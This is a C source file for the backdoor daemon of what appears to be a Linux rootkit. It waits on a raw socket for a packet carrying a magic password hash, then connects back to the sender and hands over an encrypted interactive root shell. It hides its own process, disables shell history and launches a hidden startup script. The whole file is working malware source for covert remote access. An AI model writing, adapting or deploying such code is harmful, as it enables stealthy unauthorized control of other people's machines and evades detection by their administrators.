/*
 * $Id: backdoor.c, backdoor daemon, to allow "remote logins" ;)
 */

#include "stuff.h"
#include "lib.h"

#define	RCNAME	".rc"

uchar	pass[] = HASHPASS;
extern	int silent;

char	*envp[] = {
	"TERM=linux",
	"SHELL=/bin/bash",
	"PS1="
	"\\[" /* "\\033[?24;0;47c" */ "\\033[1;30m\\]"
	"[\\[\\033[0;32m\\]\\u\\[\\033[1;32m\\]"
	"@\\[\\033[0;32m\\]\\h \\[\\033[1;37m\\]"
	"\\W\\[\\033[1;30m\\]]\\[\\033[0m\\]# ",
	"HISTFILE=/dev/null",
	"HOME=" HOME,
	"PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:./bin:"
	HOME ":" HOME "/bin",
	NULL
};

char	*argv[] = {
	"sh",
	"-i",
	NULL
};


int	hupty;

void	hup(int n)
{
	_exit(0);
}

/* creates tty/pty name by index */
void    get_tty(int num, char *base, char *buf)
{
        char    series[] = "pqrstuvwxyzabcde";
        char    subs[] = "0123456789abcdef";
        int     pos = strlen(base);

        strcpy(buf, base);
        buf[pos] = series[(num >> 4) & 0xF];
        buf[pos+1] = subs[num & 0xF];
        buf[pos+2] = 0;
}

/* search for free pty and open it */
int     open_tty(int *tty, int *pty)
{
        char    buf[512];
        int     i, fd;

        fd = open("/dev/ptmx", O_RDWR, 0);
        close(fd);

        for (i=0; i < 256; i++) {
                get_tty(i, "/dev/pty", buf);
                *pty = open(buf, O_RDWR, 0);
                if (*pty < 0) continue;
                get_tty(i, "/dev/tty", buf);
                *tty = open(buf, O_RDWR, 0);
                if (*tty < 0) {
                        close(*pty);
                        continue;
                }
                return 1;
        }
        return 0;
}


int	sig_child(int n)
{
	signal(SIGCHLD, sig_child);
	waitpid(-1, NULL, WNOHANG);
	return 0;
}

void	daemonize()
{
	int	i;
	setsid();
	chdir("/");

	i = open("/dev/null", O_RDWR, 0);
        dup2(i, 0);
        dup2(i, 1);
        dup2(i, 2);
	close(i);

	for (i = 1; i < 64; i++)
		signal(i, SIG_IGN);

	signal(SIGCHLD, sig_child);
}

int	enprint(int fd, uchar *msg, crypt_ctx *ctx)
{
	char	buf[1024];
	int	l = strlen(msg);

	memcpy(buf, msg, l);
	encrypt_data(ctx, buf, l);
	return write(fd, buf, l);
}

#define	BUF	16384

void	login(struct auth *a, struct in_addr ip)
{
	crypt_ctx	crypt, decrypt;
	int		tty, pty;
	int		sock;
	struct		sockaddr_in cli;
	int		subshell;
	uchar		buf[BUF];
	uchar		term[ENVLEN];

	if (fork() != 0)
		return;

	setpgid(0, 0);

	sock = socket(AF_INET, SOCK_STREAM, 6);
	if (sock < 0)
		_exit(1);

	CLEAR(cli);
	cli.sin_family = AF_INET;
	cli.sin_port = a->port;
	cli.sin_addr = ip;

	if (connect(sock, (struct sockaddr *) &cli, sizeof(cli)) < 0) {
		close(sock);
		_exit(1);
	}

	crypt_init((struct hash *) pass, &crypt);
	crypt_init((struct hash *) pass, &decrypt);

	read(sock, term, ENVLEN);
	decrypt_data(&decrypt, term, ENVLEN);
	if (term[0])
		envp[0] = term;

	enprint(sock, BANNER "\n", &crypt);

	if (!open_tty(&tty, &pty)) {
		enprint(sock, "Can't open a tty, all in use ?\n", &crypt);
		close(sock);
		_exit(1);
	}

	subshell = fork();
	if (subshell < 0) {
		enprint(sock, "Can't fork subshell, there is no way...\n", &crypt);
		close(sock);
		_exit(1);
	}

	if (subshell == 0) {
		int	i;
		close(pty);
		setsid();
		ioctl(tty, TIOCSCTTY, NULL);
		close(sock);
		for (i = 1; i < 64; i++)
			signal(i, SIG_DFL);
                dup2(tty, 0);
                dup2(tty, 1);
                dup2(tty, 2);
                close(tty);
		chdir(HOME);
                execve("/bin/sh", argv, envp);
		silent = 0;
		printf("Can't execve shell!\n");
		close(0); close(1); close(2);
		_exit(1);
	}
	close(tty);
	signal(SIGPIPE, hup);
	signal(SIGIO, hup);
	signal(SIGTERM, hup);
	signal(SIGHUP, hup);
	signal(SIGALRM, hup);
	hupty = pty;

	while (1) {
		int	err;
		fd_set  fds;

		FD_ZERO(&fds);
		FD_SET(pty, &fds);
		FD_SET(sock, &fds);

		err = select((pty > sock) ? (pty+1) : (sock+1),
			&fds, NULL, NULL, NULL);

		if (err < 0) {
			if (err == -EINTR)
				continue;
			break;
		}

		/* tty => client */
		if (FD_ISSET(pty, &fds)) {
			int count = read(pty, buf, BUF);
			if ((count <= 0) && (count != -EINTR))
				break;
			encrypt_data(&crypt, buf, count);
			write(sock, buf, count);
		}

		if (FD_ISSET(sock, &fds)) {
			int	count;
			uchar	*p;

			count = read(sock, buf, BUF);
			if ((count <= 0) && (count != -EINTR))
				break;

			alarm(BDTIMEOUT);

			decrypt_data(&decrypt, buf, count);
			p = memchr(buf, ECHAR, count);
			if (p) {
                                struct  winsize ws;
				int	t;

				ws.ws_xpixel = ws.ws_ypixel = 0;
				ws.ws_col = (p[1] << 8) + p[2];
				ws.ws_row = (p[3] << 8) + p[4];
				if (ws.ws_col & ws.ws_row) {
					ioctl(pty, TIOCSWINSZ, &ws);
        	                        kill(0, SIGWINCH);
				}
				write(pty, buf, p-buf);
				t = (buf+count) - (p+5);
				if (t > 0)
					write(pty, p+5, t);
			} else {
				write(pty, buf, count);
			}
		}
	}
	close(pty);
	close(sock);
	_exit(0);
}

int	backdoor_init()
{
	int	sock, pid;
	struct	sockaddr_in	raw;
	struct	hash	h;
	sk_io	cmd;

	printf("BD_Init: Starting backdoor daemon...");
	sock = socket(AF_INET, SOCK_RAW, 6);
	if (sock < 0) {
		printf("FUCK: Can't allocate raw socket (%d)\n", -sock);
		return 1;
	}

	pid = fork();

	if (pid < 0) {
		close(sock);
		printf("FUCK: Can't fork child (%d)\n", -pid);
		return 1;
	}

	if (pid != 0) {
		printf("Done, pid=%d\n", pid);
		close(sock);
		return 0;
	}

	daemonize();

	cmd.arg = getpid();
	skio(CMD_HIDEPID, &cmd);

	pid = fork();
	if (pid == 0) {
		close(sock);
		pid = open("/dev/null", O_RDWR, 0);
		dup2(pid, 0);
		dup2(pid, 1);
		dup2(pid, 2);
		chdir(HOME);
		argv[0] = RCNAME;
		execve(HOME "/" RCNAME, argv, envp);
		_exit(0);
	}

	hash160(pass, sizeof(struct hash), &h);

	/* wait for client's packet */
	/* this should be modified to packet sniffer, though
	   btw, on high traffic it takes worth of CPU usage ;( */
	while (1) {
		ulong	slen;
		struct	ippkt p;
		int	i;

		slen = sizeof(raw);
		CLEAR(p);
		i = recvfrom(sock, &p, sizeof(p), 0,
			(struct sockaddr *) &raw, &slen);

		if (i >= (sizeof(p.ip) + sizeof(p.tcp) + 12 + sizeof(struct auth))) {
			if (!memcmp(&h, p.data, sizeof(struct hash)))
				login((struct auth *) p.data, raw.sin_addr);
		}
	}
}
